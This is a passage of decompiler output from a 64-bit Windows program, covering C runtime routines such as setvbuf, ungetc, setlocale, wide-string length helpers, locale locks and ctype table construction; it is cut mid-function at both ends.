    *(_DWORD *)(v3 + 32) = v2;
    goto LABEL_8;
  }
  v5 = calloc_base(v2, 1u);
  free_base(nullptr);
  if ( v5 == nullptr )
  {
    ++dword_1400A0170;
    return 0xFFFFFFFFLL;
  }
  v3 = **(_QWORD **)(a1 + 8);
  _InterlockedOr((volatile signed __int32 *)(v3 + 20), 0x140u);
  *(_DWORD *)(v3 + 32) = v2;
  *(_QWORD *)v3 = v5;
  *(_QWORD *)(v3 + 8) = v5;
LABEL_9:
  *(_DWORD *)(v3 + 16) = 0;
  return 0;
}


// ----- setvbuf @ 0x140017354 -----
int __cdecl setvbuf(FILE *Stream, char *Buffer, int Mode, size_t Size)
{
  int v4; // edi
  int v5; // ebx
  int v6; // ebx
  _QWORD v8[2]; // [rsp+30h] [rbp-39h] BYREF
  char v9; // [rsp+40h] [rbp-29h]
  __int128 v10; // [rsp+48h] [rbp-21h]
  char v11; // [rsp+58h] [rbp-11h]
  int v12; // [rsp+5Ch] [rbp-Dh]
  char v13; // [rsp+60h] [rbp-9h]
  int v14; // [rsp+64h] [rbp-5h]
  char v15; // [rsp+68h] [rbp-1h]
  char *v16; // [rsp+70h] [rbp+7h] BYREF
  FILE *v17; // [rsp+78h] [rbp+Fh] BYREF
  FILE *v18; // [rsp+80h] [rbp+17h] BYREF
  _QWORD v19[7]; // [rsp+88h] [rbp+1Fh] BYREF
  int v20; // [rsp+D0h] [rbp+67h] BYREF
  size_t v21; // [rsp+D8h] [rbp+6Fh] BYREF
  char v22; // [rsp+E0h] [rbp+77h] BYREF
  FILE *v23; // [rsp+E8h] [rbp+7Fh] BYREF

  v8[0] = 0;
  v9 = 0;
  v11 = 0;
  v13 = 0;
  v15 = 0;
  if ( dword_1400A0560 == 0 )
  {
    v11 = 1;
    v10 = *(_OWORD *)&off_14009ECA8;
  }
  v21 = Size;
  v20 = Mode;
  v16 = Buffer;
  v23 = Stream;
  if ( Stream != nullptr && (Mode == 4 || (Mode == 0 || Mode == 64) && Size - 2 <= 0x7FFFFFFD) )
  {
    v17 = Stream;
    v19[0] = &v21;
    v18 = Stream;
    v19[1] = &v23;
    v19[2] = v8;
    v19[3] = &v20;
    v19[4] = &v16;
    v4 = __crt_seh_guarded_call<int>::operator()<_lambda_a81aa23bb2c9577c1e55b9d0b57d9de4_,_lambda_9a20e10065b92b5193c3597a66cba9d4_ &,_lambda_cb3a421ff86d8a5f008440ee6b28fa9c_>(
           (__int64)&v22,
           &v18,
           (__int64)v19,
           &v17);
  }
  else
  {
    v13 = 1;
    v12 = 22;
    sub_14001CD94(nullptr, nullptr, nullptr, 0, 0, (__crt_cached_ptd_host *)v8);
    v4 = -1;
  }
  if ( v11 == 2 )
    *(_DWORD *)(v8[0] + 936LL) &= ~2u;
  if ( v13 != 0 )
  {
    v5 = v12;
    *(_DWORD *)(unknown_libname_79((__int64)v8) + 32) = v5;
  }
  if ( v15 != 0 )
  {
    v6 = v14;
    *(_DWORD *)(unknown_libname_79((__int64)v8) + 36) = v6;
  }
  return v4;
}


// ----- _ungetc_nolock @ 0x14001748c -----
int __cdecl ungetc_nolock(int Character, FILE *Stream)
{
  int v4; // eax
  _BYTE *v5; // r9
  __int64 v6; // rdx
  __int64 v7; // rcx
  _BYTE *v8; // r10
  int base_high; // ecx
  char *ptr; // rdx
  int v12; // eax
  char *v13; // rcx

  if ( (HIDWORD(Stream->_base) & 0x1000) == 0 )
  {
    v4 = fileno(Stream);
    v5 = &unk_14009ECC0;
    v6 = v4;
    v7 = (unsigned int)(v4 + 2);
    if ( (unsigned int)v7 <= 1 )
    {
      v8 = &unk_14009ECC0;
    }
    else
    {
      v7 = 9LL * (v4 & 0x3F);
      v8 = (_BYTE *)(qword_1400A0680[(__int64)v4 >> 6] + 72LL * (v4 & 0x3F));
    }
    if ( v8[57] != 0 )
      goto LABEL_9;
    if ( (unsigned int)(v4 + 2) > 1 )
    {
      v6 = v4 & 0x3F;
      v7 = 9 * v6;
      v5 = (_BYTE *)(qword_1400A0680[(__int64)v4 >> 6] + 72 * v6);
    }
    if ( (v5[61] & 1) != 0 )
    {
LABEL_9:
      *(_DWORD *)sub_140018888(v7, v6) = 22;
      invalid_parameter_noinfo();
      return -1;
    }
  }
  if ( Character == -1 )
    return -1;
  base_high = HIDWORD(Stream->_base);
  if ( (base_high & 1) == 0 && (base_high & 6) != 6 )
    return -1;
  if ( *(_QWORD *)&Stream->_cnt == 0 )
    _acrt_stdio_allocate_buffer_nolock(Stream);
  if ( Stream->_ptr == *(char **)&Stream->_cnt )
  {
    if ( LODWORD(Stream->_base) != 0 )
      return -1;
    ++Stream->_ptr;
  }
  ptr = Stream->_ptr;
  v12 = HIDWORD(Stream->_base) >> 12;
  v13 = Stream->_ptr - 1;
  Stream->_ptr = v13;
  if ( (v12 & 1) != 0 )
  {
    if ( *v13 != (_BYTE)Character )
    {
      Stream->_ptr = ptr;
      return -1;
    }
  }
  else
  {
    *v13 = Character;
  }
  ++LODWORD(Stream->_base);
  _InterlockedAnd((volatile signed __int32 *)&Stream->_base + 1, 0xFFFFFFF7);
  _InterlockedOr((volatile signed __int32 *)&Stream->_base + 1, 1u);
  return (unsigned __int8)Character;
}


// ----- ungetc @ 0x1400175ac -----
// local variable allocation has failed, the output may be wrong!
int __cdecl ungetc(int Character, FILE *Stream)
{
  int v5; // edi

  if ( Stream != nullptr )
  {
    lock_file(Stream);
    v5 = ungetc_nolock(Character, Stream);
    unlock_file(Stream);
    return v5;
  }
  else
  {
    *(_DWORD *)sub_140018888(*(_QWORD *)&Character, 0) = 22;
    invalid_parameter_noinfo();
    return -1;
  }
}


// ----- sub_140017610 @ 0x140017610 -----
// local variable allocation has failed, the output may be wrong!
__int64 __fastcall sub_140017610(__m128i *a1, __int64 a2, double _XMM2_8)
{
  __m128i *v5; // rdx
  unsigned __int64 v6; // r9
  __int64 v7; // rcx
  unsigned __int64 v8; // r9
  __m128i *v9; // rax
  __int64 v10; // rdx
  __int64 result; // rax
  __m128i *i; // rax
  __int64 v16; // rcx
  unsigned __int64 v17; // r9
  __m128i *v18; // rax
  unsigned __int64 v19; // r9
  __m128i *v20; // rcx

  if ( dword_14009E908 >= 5 )
  {
    v5 = a1;
    if ( ((unsigned __int8)a1 & 1) != 0 )
    {
      while ( v5->m128i_i16[0] != 0 )
        v5 = (__m128i *)((char *)v5 + 2);
    }
    else
    {
      v6 = 0;
      v7 = (unsigned __int8)a1 & 0x1F;
      if ( v7 != 0 )
        v6 = 32 - v7;
      v8 = v6 >> 1;
      v9 = (__m128i *)((char *)a1 + 2 * v8);
      if ( a1 != v9 )
      {
        do
        {
          if ( v5->m128i_i16[0] == 0 )
            break;
          v5 = (__m128i *)((char *)v5 + 2);
        }
        while ( v5 != v9 );
      }
      v10 = ((char *)v5 - (char *)a1) >> 1;
      if ( v10 != v8 )
        return v10;
      v5 = (__m128i *)((char *)a1 + 2 * v10);
      __asm { vpxor   xmm2, xmm2, xmm2 }
      while ( 1 )
      {
        __asm
        {
          vpcmpeqw ymm1, ymm2, ymmword ptr [rdx]
          vpmovmskb eax, ymm1
        }
        if ( _EAX != 0 )
          break;
        v5 += 2;
      }
      __asm { vzeroupper }
      while ( v5->m128i_i16[0] != 0 )
        v5 = (__m128i *)((char *)v5 + 2);
    }
    return ((char *)v5 - (char *)a1) >> 1;
  }
  if ( dword_14009E908 < 1 )
  {
    for ( i = a1; i->m128i_i16[0] != 0; i = (__m128i *)((char *)i + 2) )
      ;
    return ((char *)i - (char *)a1) >> 1;
  }
  if ( ((unsigned __int8)a1 & 1) != 0 )
  {
    for ( i = a1; i->m128i_i16[0] != 0; i = (__m128i *)((char *)i + 2) )
      ;
    return ((char *)i - (char *)a1) >> 1;
  }
  v16 = (unsigned __int8)a1 & 0xF;
  v17 = 0;
  if ( v16 != 0 )
    v17 = 16 - v16;
  v18 = a1;
  v19 = v17 >> 1;
  v20 = (__m128i *)((char *)a1 + 2 * v19);
  if ( a1 != v20 )
  {
    do
    {
      if ( v18->m128i_i16[0] == 0 )
        break;
      v18 = (__m128i *)((char *)v18 + 2);
    }
    while ( v18 != v20 );
  }
  result = ((char *)v18 - (char *)a1) >> 1;
  if ( result == v19 )
  {
    for ( i = (__m128i *)((char *)a1 + 2 * result); _mm_movemask_epi8(_mm_cmpeq_epi16((__m128i)0LL, *i)) == 0; ++i )
      ;
    while ( i->m128i_i16[0] != 0 )
      i = (__m128i *)((char *)i + 2);
    return ((char *)i - (char *)a1) >> 1;
  }
  return result;
}


// ----- sub_140017760 @ 0x140017760 -----
__int64 __fastcall sub_140017760(_WORD *a1, unsigned __int64 a2)
{
  _WORD *v6; // rax
  _WORD *v7; // rdx
  __int64 result; // rax
  unsigned __int64 v9; // r10
  __int64 v10; // rcx
  _WORD *v11; // rdx
  unsigned __int64 v12; // r10
  _WORD *v13; // rax
  __int64 v14; // rdx
  _WORD *v15; // r8
  _WORD *i; // rdx
  _WORD *j; // rax
  _WORD *v19; // rcx
  _WORD *k; // rax
  unsigned __int64 v21; // r10
  __int64 v22; // rcx
  _WORD *v23; // rax
  unsigned __int64 v24; // r10
  _WORD *v25; // rcx
  __m128i *v26; // r8
  __m128i *m; // rcx
  __m128i *n; // rax
  _WORD *v29; // rcx

  if ( dword_14009E908 >= 5 )
  {
    if ( ((unsigned __int8)a1 & 1) != 0 )
    {
      v6 = &a1[a2];
      v7 = a1;
      if ( a1 != v6 )
      {
        while ( *v7 != 0 )
        {
          if ( ++v7 == v6 )
            return v7 - a1;
        }
      }
    }
    else
    {
      v9 = 0;
      v10 = (unsigned __int8)a1 & 0x1F;
      v11 = a1;
      if ( v10 != 0 )
        v9 = 32 - v10;
      v12 = v9 >> 1;
      if ( a2 < v12 )
        v12 = a2;
      v13 = &a1[v12];
      if ( a1 != v13 )
      {
        do
        {
          if ( *v11 == 0 )
            break;
          ++v11;
        }
        while ( v11 != v13 );
      }
      v14 = v11 - a1;
      if ( v14 != v12 )
        return v14;
      v15 = &a1[v14];
      for ( i = &a1[v14 + a2 - v12 - (((_BYTE)a2 - (_BYTE)v12) & 0x1F)]; v15 != i; v15 += 16 )
      {
        __asm
        {
          vpxor   xmm1, xmm1, xmm1
          vpcmpeqw ymm1, ymm1, ymmword ptr [r8]
          vpmovmskb eax, ymm1
        }
        __asm { vzeroupper }
        if ( _EAX != 0 )
          break;
      }
      for ( j = &a1[a2]; v15 != j; ++v15 )
      {
        if ( *v15 == 0 )
          break;
      }
      v7 = v15;
    }
    return v7 - a1;
  }
  if ( dword_14009E908 < 1 )
  {
    v29 = &a1[a2];
    for ( k = a1; k != v29; ++k )
    {
      if ( *k == 0 )
        break;
    }
    return k - a1;
  }
  if ( ((unsigned __int8)a1 & 1) != 0 )
  {
    v19 = &a1[a2];
    k = a1;
    if ( a1 != v19 )
    {
      while ( *k != 0 )
      {
        if ( ++k == v19 )
          return k - a1;
      }
    }
    return k - a1;
  }
  v21 = 0;
  v22 = (unsigned __int8)a1 & 0xF;
  if ( v22 != 0 )
    v21 = 16 - v22;
  v23 = a1;
  v24 = v21 >> 1;
  if ( a2 < v24 )
    v24 = a2;
  v25 = &a1[v24];
  if ( a1 != v25 )
  {
    do
    {
      if ( *v23 == 0 )
        break;
      ++v23;
    }
    while ( v23 != v25 );
  }
  result = v23 - a1;
  if ( result == v24 )
  {
    v26 = (__m128i *)&a1[result];
    for ( m = (__m128i *)&a1[result + a2 - v24 - (((_BYTE)a2 - (_BYTE)v24) & 0xF)]; v26 != m; ++v26 )
    {
      if ( _mm_movemask_epi8(_mm_cmpeq_epi16((__m128i)0LL, *v26)) != 0 )
        break;
    }
    for ( n = (__m128i *)&a1[a2]; v26 != n; v26 = (__m128i *)((char *)v26 + 2) )
    {
      if ( v26->m128i_i16[0] == 0 )
        break;
    }
    return ((char *)v26 - (char *)a1) >> 1;
  }
  return result;
}


// ----- __vcrt_initialize_locks @ 0x140017968 -----
char _vcrt_initialize_locks()
{
  __int64 v0; // rbx

  v0 = 0;
  while ( InitializeCriticalSectionEx((LPCRITICAL_SECTION)&unk_1400A0180 + v0, 0xFA0u, 0) )
  {
    ++dword_1400A03D8;
    v0 = (unsigned int)(v0 + 1);
    if ( (unsigned int)v0 >= 0xF )
      return 1;
  }
  _vcrt_uninitialize_locks_0(0);
  return 0;
}


// ----- __vcrt_lock @ 0x1400179b0 -----
void __fastcall _vcrt_lock(int a1)
{
  EnterCriticalSection((LPCRITICAL_SECTION)&unk_1400A0180 + a1);
}


// ----- __vcrt_uninitialize_locks_0 @ 0x1400179cc -----
char _vcrt_uninitialize_locks_0()
{
  int v0; // ebx

  v0 = dword_1400A03D8;
  while ( v0 != 0 )
  {
    DeleteCriticalSection((LPCRITICAL_SECTION)&unk_1400A0180 + (unsigned int)--v0);
    --dword_1400A03D8;
  }
  return 1;
}


// ----- __vcrt_unlock @ 0x140017a04 -----
void __fastcall _vcrt_unlock(int a1)
{
  LeaveCriticalSection((LPCRITICAL_SECTION)&unk_1400A0180 + a1);
}


// ----- _lock_locales @ 0x140017a20 -----
void __cdecl lock_locales()
{
  sub_14001D738();
  EnterCriticalSection((LPCRITICAL_SECTION)&unk_1400A0220);
}


// ----- _Init_thread_unlock @ 0x140017a3c -----
void Init_thread_unlock()
{
  LeaveCriticalSection((LPCRITICAL_SECTION)&unk_1400A0220);
}


// ----- j__malloc_base @ 0x140017a50 -----
// attributes: thunk
void *__cdecl j__malloc_base(size_t Size)
{
  return malloc_base(Size);
}


// ----- ??$?RV_lambda_9bd929c17696992ce54f1d748594fc62_@@AEAV_lambda_082c17da81b0962e08c0587ee0fac50c_@@V_lambda_9c08ac857f4975304d44e9f601d9b878_@@@?$__crt_seh_guarded_call@PEAD@@QEAAPEAD$$QEAV_lambda_9bd929c17696992ce54f1d748594fc62_@@AEAV_lambda_082c17da81b0962e08c0587ee0fac50c_@@$$QEAV_lambda_9c08ac857f4975304d44e9f601d9b878_@@@Z @ 0x140017a58 -----
__int64 __fastcall __crt_seh_guarded_call<char *>::operator()<_lambda_9bd929c17696992ce54f1d748594fc62_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_9c08ac857f4975304d44e9f601d9b878_>(
        __int64 a1,
        int *a2,
        __int64 a3,
        int *a4)
{
  __int64 v6; // rdi

  _vcrt_lock(*a2);
  v6 = sub_140017A98(a3);
  _vcrt_unlock(*a4);
  return v6;
}


// ----- sub_140017A98 @ 0x140017a98 -----
char *__fastcall sub_140017A98(int **a1)
{
  const char *v2; // rsi
  int v3; // r14d
  wchar_t *v4; // r14
  errno_t v5; // eax
  wchar_t *v6; // rax
  wchar_t *v7; // rcx
  wchar_t *v8; // rbx
  errno_t v10; // eax
  __int64 v11; // r13
  struct __crt_multibyte_data *v12; // rcx
  errno_t v13; // eax
  char *v14; // rax
  wchar_t *v15; // rsi
  char *v16; // r15
  errno_t v17; // eax
  struct __crt_locale_data *locinfo; // rbx
  volatile signed __int32 *v19; // rdx
  volatile signed __int32 *v20; // rdx
  __crt_locale_pointers Locale; // [rsp+30h] [rbp-10h] BYREF
  size_t Count; // [rsp+70h] [rbp+30h] BYREF
  size_t PtNumOfCharConverted; // [rsp+78h] [rbp+38h] BYREF

  v2 = *(const char **)a1[1];
  v3 = **a1;
  if ( v2 != nullptr )
  {
    Count = 0;
    v5 = mbstowcs_s(&Count, nullptr, 0, v2, 0x7FFFFFFFu);
    if ( v5 != 22 && v5 != 34 )
    {
      v6 = (wchar_t *)calloc_base(Count, 2u);
      v7 = nullptr;
      v8 = v6;
      if ( v6 == nullptr )
      {
LABEL_6:
        free_base(v7);
        return nullptr;
      }
      v10 = mbstowcs_s(nullptr, v6, Count, v2, 0xFFFFFFFFFFFFFFFFuLL);
      if ( v10 == 0 )
      {
        v4 = wsetlocale(v3, v8);
        free_base(v8);
        goto LABEL_13;
      }
      if ( v10 != 22 && v10 != 34 )
      {
        v7 = v8;
        goto LABEL_6;
      }
    }
    invoke_watson(nullptr, nullptr, nullptr, 0, 0);
  }
  v4 = wsetlocale(v3, nullptr);
LABEL_13:
  if ( v4 == nullptr )
    return nullptr;
  v11 = sub_14001C7D8();
  Locale.locinfo = *(struct __crt_locale_data **)(v11 + 144);
  v12 = *(struct __crt_multibyte_data **)(v11 + 136);
  PtNumOfCharConverted = 0;
  Locale.mbcinfo = v12;
  v13 = wcstombs_s_l(&PtNumOfCharConverted, nullptr, 0, v4, 0, &Locale);
  if ( v13 != 0 )
  {
    if ( v13 != 22 && v13 != 34 )
      return nullptr;
LABEL_32:
    invoke_watson(nullptr, nullptr, nullptr, 0, 0);
  }
  v14 = (char *)malloc_base(PtNumOfCharConverted + 4);
  v15 = (wchar_t *)v14;
  if ( v14 == nullptr )
    return nullptr;
  v16 = v14 + 4;
  v17 = wcstombs_s_l(nullptr, v14 + 4, PtNumOfCharConverted, v4, 0xFFFFFFFFFFFFFFFFuLL, &Locale);
  if ( v17 != 0 )
  {
    if ( v17 == 22 || v17 == 34 )
      goto LABEL_32;
    v7 = v15;
    goto LABEL_6;
  }
  locinfo = Locale.locinfo;
  v19 = *((volatile signed __int32 **)Locale.locinfo + 4 * **a1 + 6);
  if ( v19 != nullptr && _InterlockedExchangeAdd(v19, 0xFFFFFFFF) == 1 )
  {
    free_base(*((void **)locinfo + 4 * **a1 + 6));
    *((_QWORD *)locinfo + 4 * **a1 + 6) = 0;
  }
  if ( (*(_DWORD *)(v11 + 936) & dword_14009EE10) == 0 )
  {
    v20 = *((volatile signed __int32 **)locinfo + 4 * **a1 + 6);
    if ( v20 != nullptr && _InterlockedExchangeAdd(v20, 0xFFFFFFFF) == 1 )
    {
      free_base(*((void **)locinfo + 4 * **a1 + 6));
      *((_QWORD *)locinfo + 4 * **a1 + 6) = 0;
    }
  }
  *(_DWORD *)v15 = *((_DWORD *)locinfo + 4);
  *((_QWORD *)locinfo + 4 * **a1 + 6) = v15;
  *((_QWORD *)locinfo + 4 * **a1 + 4) = v16;
  return v16;
}


// ----- setlocale @ 0x140017d38 -----
char *__cdecl setlocale(int Category, const char *Locale)
{
  int v3; // [rsp+20h] [rbp-20h] BYREF
  _QWORD v4[3]; // [rsp+28h] [rbp-18h] BYREF
  int v5; // [rsp+50h] [rbp+10h] BYREF
  const char *v6; // [rsp+58h] [rbp+18h] BYREF
  char v7; // [rsp+60h] [rbp+20h] BYREF
  int v8; // [rsp+68h] [rbp+28h] BYREF

  v6 = Locale;
  v5 = Category;
  sub_14001D738();
  v4[0] = &v5;
  v4[1] = &v6;
  v8 = 4;
  v3 = 4;
  return (char *)__crt_seh_guarded_call<char *>::operator()<_lambda_9bd929c17696992ce54f1d748594fc62_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_9c08ac857f4975304d44e9f601d9b878_>(
                   (__int64)&v7,
                   &v3,
                   (__int64)v4,
                   &v8);
}


// ----- __pctype_func @ 0x140017d84 -----
const unsigned __int16 *__cdecl _pctype_func()
{
  __int64 v0; // rax
  const unsigned __int16 **v2; // [rsp+30h] [rbp+8h] BYREF

  v0 = sub_14001C7D8();
  v2 = *(const unsigned __int16 ***)(v0 + 144);
  sub_14001C98C(v0, &v2);
  return *v2;
}


// ----- islower @ 0x140017dc0 -----
int __cdecl islower(int C)
{
  __int64 v1; // rbx
  unsigned int v2; // edi
  __int64 v4; // rax
  __int64 v5; // [rsp+38h] [rbp+10h] BYREF

  v1 = C;
  v2 = C + 1;
  if ( dword_1400A0560 != 0 )
  {
    v4 = sub_14001C7D8();
    v5 = *(_QWORD *)(v4 + 144);
    sub_14001C98C(v4, &v5);
    if ( v2 <= 0x100 )
      return *(_WORD *)(*(_QWORD *)v5 + 2 * v1) & 2;
    if ( *(int *)(v5 + 8) > 1 )
      return isctype_l(v1, 2, nullptr);
  }
  else if ( v2 <= 0x100 )
  {
    return off_14009EB50[C] & 2;
  }
  return 0;
}


// ----- isupper @ 0x140017e70 -----
int __cdecl isupper(int C)
{
  __int64 v1; // rbx
  unsigned int v2; // edi
  __int64 v4; // rax
  __int64 v5; // [rsp+38h] [rbp+10h] BYREF

  v1 = C;
  v2 = C + 1;
  if ( dword_1400A0560 != 0 )
  {
    v4 = sub_14001C7D8();
    v5 = *(_QWORD *)(v4 + 144);
    sub_14001C98C(v4, &v5);
    if ( v2 <= 0x100 )
      return *(_WORD *)(*(_QWORD *)v5 + 2 * v1) & 1;
    if ( *(int *)(v5 + 8) > 1 )
      return isctype_l(v1, 1, nullptr);
  }
  else if ( v2 <= 0x100 )
  {
    return off_14009EB50[C] & 1;
  }
  return 0;
}


// ----- ___lc_codepage_func @ 0x140017f18 -----
unsigned int __cdecl __lc_codepage_func()
{
  __int64 v0; // rax
  __int64 v2; // [rsp+30h] [rbp+8h] BYREF

  v0 = sub_14001C7D8();
  v2 = *(_QWORD *)(v0 + 144);
  sub_14001C98C(v0, &v2);
  return *(_DWORD *)(v2 + 12);
}


// ----- ___lc_locale_name_func @ 0x140017f48 -----
wchar_t **__cdecl __lc_locale_name_func()
{
  __int64 v0; // rax
  __int64 v2; // [rsp+30h] [rbp+8h] BYREF

  v0 = sub_14001C7D8();
  v2 = *(_QWORD *)(v0 + 144);
  sub_14001C98C(v0, &v2);
  return (wchar_t **)(v2 + 296);
}


// ----- sub_140017F7C @ 0x140017f7c -----
__int64 __fastcall sub_140017F7C(unsigned __int64 a1)
{
  __int64 v1; // r8
  unsigned int v2; // ebx
  WORD *v4; // r15
  char *v5; // r14
  char *v6; // rbp
  char *v7; // r13
  UINT *v8; // r12
  char *v9; // rdx
  int i; // eax
  int v11; // edx
  BYTE *j; // rcx
  int v13; // edx
  __int64 v14; // rax
  _BYTE *v15; // rdx
  __int16 *v16; // r9
  int k; // ecx
  __int16 v18; // ax
  BYTE *m; // rdx
  int v20; // ecx
  __int128 v21; // xmm1
  __int128 v22; // xmm1
  __int128 v23; // xmm1
  __int128 v24; // xmm1
  __int128 v25; // xmm0
  __int64 v26; // rax
  __int128 v27; // xmm1
  __int128 v28; // xmm0
  __int128 v29; // xmm1
  __int128 v30; // xmm0
  __int128 v31; // xmm1
  __int128 v32; // xmm0
  __int128 v33; // xmm1
  __int128 v34; // xmm0
  __int128 v35; // xmm1
  __int128 v36; // xmm0
  __int128 v37; // xmm1
  __int128 v38; // xmm0
  __int128 v39; // xmm1
  __int128 v40; // xmm0
  __int128 v41; // xmm1
  __int128 v42; // xmm0
  __int128 v43; // xmm1
  __int128 v44; // xmm0
  volatile signed __int32 *v45; // rcx
  volatile signed __int32 *v47; // rax
  _DWORD *Block; // [rsp+50h] [rbp-68h]
  unsigned int MaxCharSize_low; // [rsp+58h] [rbp-60h]
  unsigned __int128 v50; // [rsp+60h] [rbp-58h] BYREF
  struct _cpinfo CPInfo; // [rsp+70h] [rbp-48h] BYREF

  v1 = *(_QWORD *)(a1 + 312);
  v2 = 0;
  v50 = a1;
  v4 = nullptr;
  v5 = nullptr;
  v6 = nullptr;
  v7 = nullptr;
  memset(&CPInfo, 0, sizeof(CPInfo));
  if ( v1 != 0 )
  {
    v8 = (UINT *)(a1 + 12);
    Block = nullptr;
    if ( *(_DWORD *)(a1 + 12) == 0
      && (unsigned int)_acrt_GetLocaleInfoA((struct __crt_locale_pointers *)&v50, a1 + 12) != 0 )
    {
      goto LABEL_41;
    }
    Block = calloc_base(1u, 4u);
    free_base(nullptr);
    v4 = (WORD *)calloc_base(0x180u, 2u);
    free_base(nullptr);
    v5 = (char *)calloc_base(0x180u, 1u);
    free_base(nullptr);
    v6 = (char *)calloc_base(0x180u, 1u);
    free_base(nullptr);
    v7 = (char *)calloc_base(0x101u, 1u);
    free_base(nullptr);
    if ( Block == nullptr )
      goto LABEL_41;
    if ( v4 == nullptr )
      goto LABEL_41;
    if ( v7 == nullptr )
      goto LABEL_41;
    if ( v5 == nullptr )
      goto LABEL_41;
    if ( v6 == nullptr )
      goto LABEL_41;
    v9 = v7;
    for ( i = 0; i < 256; ++i )
      *v9++ = i;
    if ( !GetCPInfo(*v8, &CPInfo) || CPInfo.MaxCharSize > 5 )
      goto LABEL_41;
    MaxCharSize_low = LOWORD(CPInfo.MaxCharSize);
    if ( LOWORD(CPInfo.MaxCharSize) > 1u )
    {
      if ( *(_DWORD *)(a1 + 12) == 65001 )
      {
        LOBYTE(v11) = 32;
        memset(v7 + 128, v11, 0x80u);
      }
      else
      {
        for ( j = CPInfo.LeadByte; *j != 0; j += 2 )
        {
          if ( j[1] == 0 )
            break;
          v13 = *j;
          if ( v13 <= (unsigned int)j[1] )
          {
            do
            {
              v14 = v13++;
              v7[v14] = 32;
            }
            while ( v13 <= j[1] );
          }
        }
      }
    }
    if ( (unsigned int)_acrt_LCMapStringA(
                         nullptr,
                         *(wchar_t **)(a1 + 312),
                         0x100u,
                         v7 + 1,
                         255,
                         v5 + 129,
                         255,
                         *(_DWORD *)(a1 + 12),
                         0) != 0
      && (unsigned int)_acrt_LCMapStringA(
                         nullptr,
                         *(wchar_t **)(a1 + 312),
                         0x200u,
                         v7 + 1,
                         255,
                         v6 + 129,
                         255,
                         *(_DWORD *)(a1 + 12),
                         0) != 0
      && (unsigned int)_acrt_GetStringTypeA(nullptr, 1u, v4 + 128, *(_DWORD *)(a1 + 12), 0) != 0 )
    {
      v4[127] = 0;
      v5[127] = 0;
      v6[127] = 0;
      v5[128] = 0;
      v6[128] = 0;
      if ( MaxCharSize_low > 1 )
      {
        if ( *(_DWORD *)(a1 + 12) == 65001 )
        {
          v15 = v6 + 256;
          v16 = (__int16 *)(v4 + 256);
          for ( k = 128; k <= 255; ++k )
          {
            if ( (unsigned int)(k - 194) > 0x32 )
              v18 = 0;
            else
              v18 = 0x8000;
            *v16++ = v18;
            v15[v5 - v6] = k;
            *v15++ = k;
          }
        }
        else
        {
          for ( m = CPInfo.LeadByte; *m != 0; m += 2 )
          {
            if ( m[1] == 0 )
              break;
            v20 = *m;
            if ( v20 <= (unsigned int)m[1] )
            {
              do
              {
                v4[v20 + 128] = 0x8000;
                v5[v20 + 128] = v20;
                v6[v20 + 128] = v20;
                ++v20;
              }
              while ( v20 <= m[1] );
            }
          }
        }
      }
      v21 = *((_OWORD *)v4 + 33);
      *(_OWORD *)v4 = *((_OWORD *)v4 + 32);
      *((_OWORD *)v4 + 1) = v21;
      v22 = *((_OWORD *)v4 + 35);
      *((_OWORD *)v4 + 2) = *((_OWORD *)v4 + 34);
      *((_OWORD *)v4 + 3) = v22;
      v23 = *((_OWORD *)v4 + 37);
      *((_OWORD *)v4 + 4) = *((_OWORD *)v4 + 36);
      *((_OWORD *)v4 + 5) = v23;
      v24 = *((_OWORD *)v4 + 39);
      *((_OWORD *)v4 + 6) = *((_OWORD *)v4 + 38);
      v25 = *((_OWORD *)v4 + 40);
      v26 = *((_QWORD *)v4 + 94);
      *((_OWORD *)v4 + 7) = v24;
      v27 = *((_OWORD *)v4 + 41);
      *((_OWORD *)v4 + 8) = v25;
      v28 = *((_OWORD *)v4 + 42);
      *((_OWORD *)v4 + 9) = v27;
      v29 = *((_OWORD *)v4 + 43);
      *((_OWORD *)v4 + 10) = v28;
      v30 = *((_OWORD *)v4 + 44);
      *((_OWORD *)v4 + 11) = v29;
      v31 = *((_OWORD *)v4 + 45);
      *((_OWORD *)v4 + 12) = v30;
      v32 = *((_OWORD *)v4 + 46);
      *((_OWORD *)v4 + 13) = v31;
      *((_OWORD *)v4 + 14) = v32;
      *((_QWORD *)v4 + 30) = v26;
      *((_DWORD *)v4 + 62) = *((_DWORD *)v4 + 190);
      v4[126] = v4[382];
      LODWORD(v26) = *((_DWORD *)v5 + 94);
      v33 = *((_OWORD *)v5 + 17);
      *(_OWORD *)v5 = *((_OWORD *)v5 + 16);
      v34 = *((_OWORD *)v5 + 18);
      *((_OWORD *)v5 + 1) = v33;
      v35 = *((_OWORD *)v5 + 19);
      *((_OWORD *)v5 + 2) = v34;
      v36 = *((_OWORD *)v5 + 20);
      *((_OWORD *)v5 + 3) = v35;
      v37 = *((_OWORD *)v5 + 21);
      *((_OWORD *)v5 + 4) = v36;
      v38 = *((_OWORD *)v5 + 22);
      *((_OWORD *)v5 + 5) = v37;
      *(_QWORD *)&v37 = *((_QWORD *)v5 + 46);
      *((_OWORD *)v5 + 6) = v38;
      *((_QWORD *)v5 + 14) = v37;
      *((_DWORD *)v5 + 30) = v26;
      *((_WORD *)v5 + 62) = *((_WORD *)v5 + 190);
      v5[126] = v5[382];
      LODWORD(v26) = *((_DWORD *)v6 + 94);
      v39 = *((_OWORD *)v6 + 17);
      *(_OWORD *)v6 = *((_OWORD *)v6 + 16);
      v40 = *((_OWORD *)v6 + 18);
      *((_OWORD *)v6 + 1) = v39;
      v41 = *((_OWORD *)v6 + 19);
      *((_OWORD *)v6 + 2) = v40;
      v42 = *((_OWORD *)v6 + 20);
      *((_OWORD *)v6 + 3) = v41;
      v43 = *((_OWORD *)v6 + 21);
      *((_OWORD *)v6 + 4) = v42;
      v44 = *((_OWORD *)v6 + 22);
      *((_OWORD *)v6 + 5) = v43;
      *(_QWORD *)&v43 = *((_QWORD *)v6 + 46);
      *((_OWORD *)v6 + 6) = v44;
      *((_QWORD *)v6 + 14) = v43;
      *((_DWORD *)v6 + 30) = v26;
      *((_WORD *)v6 + 62) = *((_WORD *)v6 + 190);
      v6[126] = v6[382];
      v45 = *(volatile signed __int32 **)(a1 + 256);
      if ( v45 != nullptr && _InterlockedExchangeAdd(v45, 0xFFFFFFFF) == 1 )
      {
        free_base((void *)(*(_QWORD *)(a1 + 264) - 254LL));
        free_base((void *)(*(_QWORD *)(a1 + 272) - 128LL));
        free_base((void *)(*(_QWORD *)(a1 + 280) - 128LL));
        free_base(*(void **)(a1 + 256));
      }
      *Block = 1;
      *(_QWORD *)(a1 + 256) = Block;
